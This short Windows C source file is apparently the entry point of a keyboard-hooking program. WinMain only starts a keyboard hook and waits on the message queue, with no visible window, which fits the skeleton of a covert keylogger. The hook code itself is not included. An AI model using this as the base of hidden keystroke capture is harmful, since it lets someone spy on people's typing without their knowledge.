#include "header.h"

int WINAPI WinMain(HINSTANCE hThisInstance,
					HINSTANCE hPrevInstance,
					LPSTR lpszArgument,
					int nCmdShow)
//int main()
{
	StartKeyBoardHook();	
	MSG msg;	
	GetMessage(&msg, NULL, 0, 0);
	return (0);
}